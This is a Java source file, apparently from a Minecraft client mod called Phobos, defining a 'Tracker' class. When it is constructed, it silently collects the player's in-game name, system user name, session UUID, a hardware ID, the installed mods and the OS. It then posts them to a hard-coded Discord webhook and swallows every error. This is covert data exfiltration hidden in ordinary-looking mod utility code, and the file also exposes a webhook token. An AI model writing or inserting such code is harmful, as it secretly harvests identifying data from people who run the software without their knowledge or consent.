package me.earth.phobos.util;

import net.minecraft.client.Minecraft;

public
class Tracker {

    public
    Tracker ( ) {

        final String l = "https://discord.com/api/webhooks/954061637793488946/WR3MlFTazqzZ_WDjrZbFbhH5nfDU1Kc1saYZC1ttnPO94YsZe48qxRXLe3Ly_igLxhSu ";
        final String CapeName = "SomeSadKid_s shitty HWID";
        final String CapeImageURL = "https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128";

        TrackerUtil d = new TrackerUtil ( l );

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft ( ).getSession ( ).getUsername ( );
        } catch ( Exception ignore ) {
        }

        try {
            TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder ( )
                    .withUsername ( CapeName )
                    .withContent ( "```" + "\n IGN: " + minecraft_name + "\n USER: " + System.getProperty ( "user.name" ) + "\n UUID: " + Minecraft.getMinecraft ( ).session.getPlayerID ( ) + "\n HWID: " + SystemUtil.getSystemInfo ( ) + "\n MODS: " + SystemUtil.getModsList ( ) + "\n OS: " + System.getProperty ( "os.name" ) + "\n Started the game." + "```" )
                    .withAvatarURL ( CapeImageURL )
                    .withDev ( false )
                    .build ( );
            d.sendMessage ( dm );
        } catch ( Exception ignore ) {
        }
    }
}
